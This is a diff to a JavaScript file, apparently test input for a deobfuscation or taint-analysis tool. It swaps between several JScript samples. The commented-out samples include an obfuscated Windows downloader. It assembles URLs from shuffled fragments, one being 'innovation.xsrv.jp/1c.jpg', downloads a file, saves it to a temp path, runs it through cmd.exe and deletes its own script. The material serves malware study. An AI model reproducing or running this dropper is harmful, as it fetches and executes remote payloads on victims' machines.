@@ -1,27 +1,330 @@
-const initCode = `
-var lyB = jQX(7, 4);
-var lyB2 = jQX(23, 56);
+// const initCode = `
+// var lyB = jQX(7, 4);
+// var lyB2 = jQX(23, 56);
 
-function jQX(ea, b) {
-    var K = 24;
-	var k2 = 30;
-  	var k3 = 10
-    if (ea > b){
-      K = 2;
-  	  k2 = 20
-    } else {
-      k3 = k2 + 10
-      K = 3;
-    }
+// function jQX(ea, b) {
+//     var K = 24;
+// 	var k2 = 30;
+//   	var k3 = 10
+//     if (ea > b){
+//       K = 2;
+//   	  k2 = 20
+//     } else {
+//       k3 = k2 + 10
+//       K = 3;
+//     }
      
   
-  	var x = 2 + k2
-    var y = 4 + k3
+//   	var x = 2 + k2
+//     var y = 4 + k3
 
-    return K;
+//     return K;
+// }
+// // this example shows K is tainted in the if branch so then unless there is a solid assignment it will not be evaluated as 
+// `
+
+const initCode = `
+const jEJ = ActiveXObject;
+const w = new ActiveXObject("Scripting.Dictionary");
+w.Add("a", "b");
+const GJ = 4;
+
+if (true && w.Exists("a")) {
+    const K = 24;
+    
+    var K = oL.GetSpecialFolder(2) + "\\\\" + oL.GetTempName();
+    
+    var K = "deleteF";
+    var lyB = true;
+    GJ = 3;
 }
-// this example shows K is tainted in the if branch so then unless there is a solid assignment it will not be evaluated as 
+
+GJ > 0;
 `
+
+// const initCode = `
+// function q(fVy) {
+//     const jEJ = ActiveXObject;
+//     const w = new ActiveXObject("Scripting.Dictionary");
+//     w.Add("a", "b");
+//     const GJ = 4;
+
+//     if (fVy > 5 && w.Exists("a")) {
+//         const K = 24;
+//         const hL = [];
+//         hL[0] = "c.";
+//         hL[1] = "no";
+//         hL[2] = "/";
+//         hL[3] = "n";
+//         hL[4] = "j";
+//         hL[5] = "p";
+//         hL[6] = ":/";
+//         hL[7] = "i";
+//         hL[8] = "on";
+//         hL[9] = "v";
+//         hL[10] = ".x";
+//         hL[11] = "g";
+//         hL[12] = ".j";
+//         hL[13] = "/i";
+//         hL[14] = "tp";
+//         hL[15] = "ht";
+//         hL[16] = "t";
+//         hL[17] = "va";
+//         hL[18] = "p";
+//         hL[19] = "1";
+//         hL[20] = "sr";
+//         const a = "http://innovation.xsrv.jp/1c.jpg";
+//         K = "http://innovation.xsrv.jp/1c.jpg";
+//         var eDT;
+//         var iSj;
+//         const mj = ActiveXObject;
+//         const zs = new ActiveXObject("MSXML2.XMLHTTP");
+//         const U = 0;
+//         zs.open("GET", "http://innovation.xsrv.jp/1c.jpg", 0);
+
+//         try {
+//             zs.send();
+//         } catch (tLk) {
+//             return false;
+//         }
+
+//         if (zs.Status != 200)
+//             return false;
+
+//         var oL = new ActiveXObject("Scripting.FileSystemObject");
+//         var W = new ActiveXObject("ADODB.Stream");
+//         const AgR = "GetSpecialFolder";
+//         const bb = "GetTempName";
+//         const DK = "\\";
+//         const rPj = oL.GetSpecialFolder(2) + "\\" + oL.GetTempName();
+//         var K = oL.GetSpecialFolder(2) + "\\" + oL.GetTempName();
+//         W.Open();
+//         W.Type = 1;
+//         W.Write(zs.ResponseBody);
+//         const r = 36123;
+//         const X = 72128;
+//         const g = 392;
+//         const Ji = 0;
+//         W.Position = 0;
+//         var PD = W.Read();
+//         const uk = "ADODB.Recordse";
+//         const NU = new ActiveXObject("ADODB.Recordset");
+//         const jzg = W.Size;
+//         const DC = 201;
+//         NU.fields.append("bin", 201, W.Size);
+//         const MhN = "ope";
+//         NU.open();
+//         NU.addNew();
+//         const G = "bin";
+//         const ARD = "appendChunk";
+//         NU("bin").appendChunk(W.Read());
+//         const nI = "updat";
+//         NU.update();
+//         PD = NU("bin").value;
+
+//         if (NU("bin").value.length < 10)
+//             return false;
+
+//         W.SaveToFile(oL.GetSpecialFolder(2) + "\\" + oL.GetTempName());
+//         W.Close();
+//         var uM = ActiveXObject;
+//         var Jy = "Wscript.Shell";
+//         var xV = "c";
+//         var z = "cm";
+//         var H = "cmd";
+//         var Wch = "cmd.";
+//         var rdR = "cmd.e";
+//         var pW = "cmd.ex";
+//         var iSj = "cmd.ex";
+//         var eDT = new ActiveXObject("Wscript.Shell");
+//         var x = "run";
+//         eDT.run("cmd.exe /c " + (oL.GetSpecialFolder(2) + "\\" + oL.GetTempName()), 0);
+//         var K = "deleteF";
+//         const ffv = WScript;
+//         oL.deleteFile(WScript.ScriptFullName);
+//         var lyB = true;
+//         GJ = 3;
+//     }
+
+//     return GJ;
+// }
+// `
+
+// const initCode = `
+// function R(K) {
+//     var PD = W["Re" + "ad"]();
+//     PD = M(W, cN(7), PD);
+
+//     if (PD.length < 10)
+//         return false;
+// }
+
+// function cN(N) {
+//     return ActiveXObject;
+// }
+
+// function M(iP, OMY, Ufk) {
+//     var uk = "AD" + "OD" + "B.Re" + "cordse";
+//     var NU = new OMY(uk + "t");
+//     var jzg = iP["Si" + "ze"];
+//     var DC = 200 + 1;
+//     NU["fields"]["a" + "pp" + "e" + 'nd']("bin", DC, jzg);
+//     var MhN = "ope";
+//     NU[MhN + "n"]();
+//     NU["addNew"]();
+//     var G = "bin";
+//     var ARD = "appe" + "ndChu" + "nk";
+//     NU(G)[ARD](Ufk);
+//     var nI = "u" + "pda" + "t";
+//     NU[nI + "e"]();
+//     return NU(G)["val" + "u" + "e"];
+// }
+
+// `
+
+
+// const initCode = `
+// function R(K) {
+//     var oL = new ActiveXObject("Scripting.FileSystemObject");
+//   	var ty = 3;
+//       ty = qBE(oL);
+//     if (124 > 89) {
+//         var K = "del" + "et" + "eF";
+//         return true;
+//     }
+//     return 0;
+// }
+
+// function q(fVy) {
+//     var jEJ = cN(0);
+//     var w = new jEJ("Scripting.Dictionary");
+//     w["Add"]("a", "b");
+//     var GJ = 4;
+
+//     if (fVy > 5 && w["Exists"]("a")) {
+//         var lyB = jQX(7, 4);
+
+//         if (lyB == false)
+//             lyB = jQX(23, 56);
+
+//         GJ = 3;
+//     }
+
+//     return GJ;
+// }
+
+
+// function qBE(aDt) {
+//     const AgR = "GetSpecialFolder";
+//     const bb = "GetTempName";
+//     const DK = "\\\\";
+//     const rPj = aDt.GetSpecialFolder(2) + "\\\\" + aDt.GetTempName();
+//     return aDt.GetSpecialFolder(2) + "\\\\" + aDt.GetTempName();
+// }
+
+// function gT() {
+//     var I = [];
+//     I[0] = "/";
+//     I[1] = "la";
+//     I[2] = "e";
+//     I[3] = "is";
+//     I[4] = "a";
+//     I[5] = "en";
+//     I[6] = "-";
+//     I[7] = "nt";
+//     I[8] = "r";
+//     I[9] = "s/";
+//     I[10] = "t";
+//     I[11] = "h";
+//     I[12] = "di";
+//     I[13] = ".c";
+//     I[14] = "he";
+//     I[15] = "n";
+//     I[16] = "c/";
+//     I[17] = "wp";
+//     I[18] = "c.";
+//     I[19] = "i";
+//     I[20] = "rd";
+//     I[21] = "/";
+//     I[22] = "ht";
+//     I[23] = "a";
+//     I[24] = "g";
+//     I[25] = "/" + "/";
+//     I[26] = "co";
+//     I[27] = "1";
+//     I[28] = "he";
+//     I[29] = "om";
+//     I[30] = "em";
+//     I[31] = "pa";
+//     I[32] = "t/";
+//     I[33] = ":";
+//     I[34] = "sp";
+//     I[35] = "jp";
+//     I[36] = "tp";
+//     I[37] = "l";
+//     var cFh = I[22] + I[36] + I[33] + I[25] + I[28] + I[8] + I[12] + I[34] + I[23] + I[37] + I[4] + I[13] + I[29] + I[0] + I[17] + I[6] + I[26] + I[7] + I[5] + I[32] + I[10] + I[11] + I[30] + I[2] + I[9] + I[14] + I[20] + I[3] + I[31] + I[1] + I[21] + I[19] + I[15] + I[16] + I[27] + I[18] + I[35] + I[24];
+//     return cFh;
+// }
+
+// function JK() {
+//     var hL = [];
+//     hL[0] = "c.";
+//     hL[1] = "no";
+//     hL[2] = "/";
+//     hL[3] = "n";
+//     hL[4] = "j";
+//     hL[5] = "p";
+//     hL[6] = ":/";
+//     hL[7] = "i";
+//     hL[8] = "on";
+//     hL[9] = "v";
+//     hL[10] = ".x";
+//     hL[11] = "g";
+//     hL[12] = ".j";
+//     hL[13] = "/i";
+//     hL[14] = "tp";
+//     hL[15] = "ht";
+//     hL[16] = "t";
+//     hL[17] = "va";
+//     hL[18] = "p";
+//     hL[19] = "1";
+//     hL[20] = "sr";
+//     var a = hL[15] + hL[14] + hL[6] + hL[13] + hL[3] + hL[1] + hL[17] + hL[16] + hL[7] + hL[8] + hL[10] + hL[20] + hL[9] + hL[12] + hL[5] + hL[2] + hL[19] + hL[0] + hL[4] + hL[18] + hL[11];
+//     return a;
+// }
+
+// function jQX(ea, b) {
+//     var K = 24;
+
+//     if (ea > b)
+//         K = JK();
+//     else
+//         K = gT();
+
+//     return R(K);
+// }
+
+// while (q(43) > 0) {
+//     break;
+// }
+// `
+
+// const initCode = `
+// function R(K) {
+//     var oL = new ActiveXObject("Scripting.FileSystemObjec" + k());
+//     var K = qBE(oL);
+//     return true;
+// }
+
+// function qBE(aDt) {
+//     const AgR = "GetSpecialFolder";
+//     const bb = "GetTempName";
+//     const DK = "\\\\";
+//     const rPj = aDt.GetSpecialFolder(2) + "\\\\" + aDt.GetTempName();
+//     return aDt.GetSpecialFolder(2) + "\\\\" + aDt.GetTempName();
+// }
+
+// R("abc");`
 
 // const initCode = `
 // function R(K) {
